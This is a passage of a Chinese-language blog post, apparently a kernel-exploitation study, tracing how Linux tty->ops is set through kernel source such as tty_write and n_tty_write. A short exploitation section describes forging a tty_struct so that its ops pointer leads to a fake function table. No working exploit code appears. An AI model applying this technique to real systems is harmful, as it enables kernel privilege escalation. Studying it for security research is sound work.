        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>wait_until_sent<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span> <span class="token keyword">int</span> timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>send_xchar<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>tiocmget<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>tiocmset<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span>
                        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> set<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> clear<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>resize<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">winsize</span> <span class="token operator">*</span>ws<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>set_termiox<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">termiox</span> <span class="token operator">*</span>tnew<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>get_icount<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span>
                                <span class="token keyword">struct</span> <span class="token class-name">serial_icounter_struct</span> <span class="token operator">*</span>icount<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_CONSOLE_POLL</span></span>
        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>poll_init<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">,</span> <span class="token keyword">int</span> line<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>poll_get_char<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">,</span> <span class="token keyword">int</span> line<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>poll_put_char<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">,</span> <span class="token keyword">int</span> line<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
        <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> <span class="token operator">*</span>proc_fops<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><h3 id="tty-ops"><a href="#tty-ops" class="header-anchor">#</a> <code>tty-&gt;ops</code></h3> <p>这个函数定义了tty结构， 然后后续基本就是对这个结构体进行相关的设置， 但是后续没有对tty-&gt;ops的设置，应该是在函数<code>tty_init_dev</code>内，</p> <p><img src="https://s2.loli.net/2022/02/13/OFVpPUEqC47KaIm.png" alt="image-20220213185357205"></p> <p>这个函数定义在<code>drivers/tty/tty_io.c</code>， 仍然是调用<code>alloc_tty_struct</code>函数后简单设置返回，</p> <p><img src="https://s2.loli.net/2022/02/13/OEix8uDhS4M2W7c.png" alt="image-20220213185737733"></p> <p>继续跟进，终于在这个函数内发现了设置ops的位置，但是这是通过driver进行赋值的，</p> <p><img src="https://s2.loli.net/2022/02/13/nGY7UL83Bl26SJF.png" alt="image-20220213185827868"></p> <p>向上回溯，在<code>ptmx_open</code>发现传入的这个参数，</p> <p><img src="https://s2.loli.net/2022/02/13/agnLidZ6YAXvTFq.png" alt="image-20220213185958256"></p> <p>这是个全局变量， 在初始化函数就进行了定义。</p> <p><img src="https://s2.loli.net/2022/02/13/67nA8uT2SgkjYPR.png" alt="image-20220213183917852"></p> <p>跟进发现<code>tty_allo_driver</code>中并没有设置<code>driver-&gt;ops</code>的位置，</p> <p>在文件 <code>driver/tty/tty_io.c</code>中的这里设置ops，</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span> <span class="token function">tty_set_operations</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">,</span>
                        <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">tty_operations</span> <span class="token operator">*</span>op<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        driver<span class="token operator">-&gt;</span>ops <span class="token operator">=</span> op<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">EXPORT_SYMBOL</span><span class="token punctuation">(</span>tty_set_operations<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>在<code>init unix98_pty_init</code>函数中的后面进行设置，这个量是一个静态变量。</p> <p><img src="https://s2.loli.net/2022/02/13/WN92BHvjlyeufUA.png" alt="image-20220213194315787"></p> <p><img src="https://s2.loli.net/2022/02/13/2cRdpEbBMHiGuNf.png" alt="image-20220213194323781"></p> <p><img src="https://s2.loli.net/2022/02/13/QOhE3tD2wuxXsFa.png" alt="image-20220213202641028"></p> <h3 id="利用"><a href="#利用" class="header-anchor">#</a> 利用</h3> <p>通过上面的运行流， 我们没有办法直接伪造<code>tty_operations</code>结构体，但是可以伪造 <code>tty_struct</code>结构体，然后将<code>tty-&gt;ops</code>指向我们伪造的位置即可。</p> <h3 id="write-执行流"><a href="#write-执行流" class="header-anchor">#</a> write 执行流</h3> <p>wirte函数会转入驱动设置好的函数，这里由tty_write接收，</p> <p><img src="https://s2.loli.net/2022/02/13/izGHMvr197EVT8s.png" alt="image-20220213202556428"></p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">tty_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span>
						<span class="token class-name">size_t</span> count<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>ppos<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty <span class="token operator">=</span> <span class="token function">file_tty</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token keyword">struct</span> <span class="token class-name">tty_ldisc</span> <span class="token operator">*</span>ld<span class="token punctuation">;</span>
	<span class="token class-name">ssize_t</span> ret<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">tty_paranoia_check</span><span class="token punctuation">(</span>tty<span class="token punctuation">,</span> <span class="token function">file_inode</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;tty_write&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>tty <span class="token operator">||</span> <span class="token operator">!</span>tty<span class="token operator">-&gt;</span>ops<span class="token operator">-&gt;</span>write <span class="token operator">||</span>
		<span class="token punctuation">(</span><span class="token function">test_bit</span><span class="token punctuation">(</span>TTY_IO_ERROR<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tty<span class="token operator">-&gt;</span>flags<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">return</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span>
	<span class="token comment">/* Short term debug to catch buggy drivers */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>tty<span class="token operator">-&gt;</span>ops<span class="token operator">-&gt;</span>write_room <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token function">printk</span><span class="token punctuation">(</span>KERN_ERR <span class="token string">&quot;tty driver %s lacks a write_room method.\n&quot;</span><span class="token punctuation">,</span>
			tty<span class="token operator">-&gt;</span>driver<span class="token operator">-&gt;</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
	ld <span class="token operator">=</span> <span class="token function">tty_ldisc_ref_wait</span><span class="token punctuation">(</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ld<span class="token operator">-&gt;</span>ops<span class="token operator">-&gt;</span>write<span class="token punctuation">)</span>
		ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span>
	<span class="token keyword">else</span>
		ret <span class="token operator">=</span> <span class="token function">do_tty_write</span><span class="token punctuation">(</span>ld<span class="token operator">-&gt;</span>ops<span class="token operator">-&gt;</span>write<span class="token punctuation">,</span> tty<span class="token punctuation">,</span> file<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">tty_ldisc_deref</span><span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>基本会直接进入<code>do_tty_write</code>这个函数， 其中这个<code>ld-&gt;ops-&gt;write</code>如下：</p> <p><img src="https://s2.loli.net/2022/02/13/43af1o58nbvSmCB.png" alt="image-20220213203445700"></p> <p><code>do_tty_write</code>这个函数定义如下， 但是是<code>inline</code>定义，在调试时是被编译进了<code>tty_write</code>函数内，</p> <p><img src="https://s2.loli.net/2022/02/13/opmQW82uTDOEMcR.png" alt="image-20220213204018849"></p> <p>我们直接在<code>ld-&gt;ops-&gt;write</code>下断点即可。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token comment">/*
 * Split writes up in sane blocksizes to avoid
 * denial-of-service type attacks
 */</span>
<span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token class-name">ssize_t</span> <span class="token function">do_tty_write</span><span class="token punctuation">(</span>
	<span class="token class-name">ssize_t</span> <span class="token punctuation">(</span><span class="token operator">*</span>write<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span>
	<span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>
	<span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span>
	<span class="token class-name">size_t</span> count<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token class-name">ssize_t</span> ret<span class="token punctuation">,</span> written <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> chunk<span class="token punctuation">;</span>

	ret <span class="token operator">=</span> <span class="token function">tty_write_lock</span><span class="token punctuation">(</span>tty<span class="token punctuation">,</span> file<span class="token operator">-&gt;</span>f_flags <span class="token operator">&amp;</span> O_NDELAY<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> ret<span class="token punctuation">;</span>

	<span class="token comment">/*
	 * We chunk up writes into a temporary buffer. This
	 * simplifies low-level drivers immensely, since they
	 * don't have locking issues and user mode accesses.
	 *
	 * But if TTY_NO_WRITE_SPLIT is set, we should use a
	 * big chunk-size..
	 *
	 * The default chunk-size is 2kB, because the NTTY
	 * layer has problems with bigger chunks. It will
	 * claim to be able to handle more characters than
	 * it actually does.
	 *
	 * FIXME: This can probably go away now except that 64K chunks
	 * are too likely to fail unless switched to vmalloc...
	 */</span>
	chunk <span class="token operator">=</span> <span class="token number">2048</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">test_bit</span><span class="token punctuation">(</span>TTY_NO_WRITE_SPLIT<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tty<span class="token operator">-&gt;</span>flags<span class="token punctuation">)</span><span class="token punctuation">)</span>
		chunk <span class="token operator">=</span> <span class="token number">65536</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;</span> chunk<span class="token punctuation">)</span>
		chunk <span class="token operator">=</span> count<span class="token punctuation">;</span>

	<span class="token comment">/* write_buf/write_cnt is protected by the atomic_write_lock mutex */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>tty<span class="token operator">-&gt;</span>write_cnt <span class="token operator">&lt;</span> chunk<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>buf_chunk<span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>chunk <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">)</span>
			chunk <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>

		buf_chunk <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>chunk<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>buf_chunk<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			ret <span class="token operator">=</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
			<span class="token keyword">goto</span> out<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token function">kfree</span><span class="token punctuation">(</span>tty<span class="token operator">-&gt;</span>write_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
		tty<span class="token operator">-&gt;</span>write_cnt <span class="token operator">=</span> chunk<span class="token punctuation">;</span>
		tty<span class="token operator">-&gt;</span>write_buf <span class="token operator">=</span> buf_chunk<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">/* Do the write .. */</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token class-name">size_t</span> size <span class="token operator">=</span> count<span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;</span> chunk<span class="token punctuation">)</span>
			size <span class="token operator">=</span> chunk<span class="token punctuation">;</span>
		ret <span class="token operator">=</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>tty<span class="token operator">-&gt;</span>write_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		ret <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>tty<span class="token punctuation">,</span> file<span class="token punctuation">,</span> tty<span class="token operator">-&gt;</span>write_buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		written <span class="token operator">+=</span> ret<span class="token punctuation">;</span>
		buf <span class="token operator">+=</span> ret<span class="token punctuation">;</span>
		count <span class="token operator">-=</span> ret<span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>count<span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		ret <span class="token operator">=</span> <span class="token operator">-</span>ERESTARTSYS<span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">signal_pending</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token function">cond_resched</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>written<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">tty_update_time</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token function">file_inode</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token operator">-&gt;</span>i_mtime<span class="token punctuation">)</span><span class="token punctuation">;</span>
		ret <span class="token operator">=</span> written<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
out<span class="token operator">:</span>
	<span class="token function">tty_write_unlock</span><span class="token punctuation">(</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br></div></div><p>这个<code>n_tty_write</code>定义在<code>driver/tty/n_tty.c</code>,</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">n_tty_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token operator">*</span>tty<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>
			   <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> nr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>b <span class="token operator">=</span> buf<span class="token punctuation">;</span>
	<span class="token function">DEFINE_WAIT_FUNC</span><span class="token punctuation">(</span>wait<span class="token punctuation">,</span> woken_wake_function<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> c<span class="token punctuation">;</span>
	<span class="token class-name">ssize_t</span> retval <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	<span class="token comment">/* Job control check -- must be done at start (POSIX.1 7.1.1.4). */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">L_TOSTOP</span><span class="token punctuation">(</span>tty<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> file<span class="token operator">-&gt;</span>f_op<span class="token operator">-&gt;</span>write <span class="token operator">!=</span> redirected_tty_write<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		retval <span class="token operator">=</span> <span class="token function">tty_check_change</span><span class="token punctuation">(</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>retval<span class="token punctuation">)</span>
			<span class="token keyword">return</span> retval<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">down_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tty<span class="token operator">-&gt;</span>termios_rwsem<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* Write out any echoed characters that are still pending */</span>
	<span class="token function">process_echoes</span><span class="token punctuation">(</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">add_wait_queue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tty<span class="token operator">-&gt;</span>write_wait<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wait<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">signal_pending</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			retval <span class="token operator">=</span> <span class="token operator">-</span>ERESTARTSYS<span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">tty_hung_up_p</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>tty<span class="token operator">-&gt;</span>link <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>tty<span class="token operator">-&gt;</span>link<span class="token operator">-&gt;</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			retval <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">O_OPOST</span><span class="token punctuation">(</span>tty<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span>nr <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token class-name">ssize_t</span> num <span class="token operator">=</span> <span class="token function">process_output_block</span><span class="token punctuation">(</span>tty<span class="token punctuation">,</span> b<span class="token punctuation">,</span> nr<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token operator">-</span>EAGAIN<span class="token punctuation">)</span>
						<span class="token keyword">break</span><span class="token punctuation">;</span>
					retval <span class="token operator">=</span> num<span class="token punctuation">;</span>
					<span class="token keyword">goto</span> break_out<span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				b <span class="token operator">+=</span> num<span class="token punctuation">;</span>
				nr <span class="token operator">-=</span> num<span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>nr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				c <span class="token operator">=</span> <span class="token operator">*</span>b<span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">process_output</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> tty<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
					<span class="token keyword">break</span><span class="token punctuation">;</span>
				b<span class="token operator">++</span><span class="token punctuation">;</span> nr<span class="token operator">--</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>tty<span class="token operator">-&gt;</span>ops<span class="token operator">-&gt;</span>flush_chars<span class="token punctuation">)</span>
				tty<span class="token operator">-&gt;</span>ops<span class="token operator">-&gt;</span><span class="token function">flush_chars</span><span class="token punctuation">(</span>tty<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			<span class="token keyword">struct</span> <span class="token class-name">n_tty_data</span> <span class="token operator">*</span>ldata <span class="token operator">=</span> tty<span class="token operator">-&gt;</span>disc_data<span class="token punctuation">;</span>

